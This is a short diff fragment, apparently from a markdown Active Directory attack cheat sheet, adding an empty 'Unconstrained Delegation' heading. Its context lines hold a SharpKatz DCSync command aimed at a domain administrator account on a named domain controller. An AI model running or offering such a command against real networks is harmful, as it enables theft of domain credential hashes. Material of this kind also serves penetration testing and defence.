@@ -515,4 +515,6 @@ SharpKatz.exe --Command dcsync --User eu\administrator --Domain
 eu.local --DomainController eu-dc.eu.local
 ```
 
+#### Unconstrained Delegation
+
 
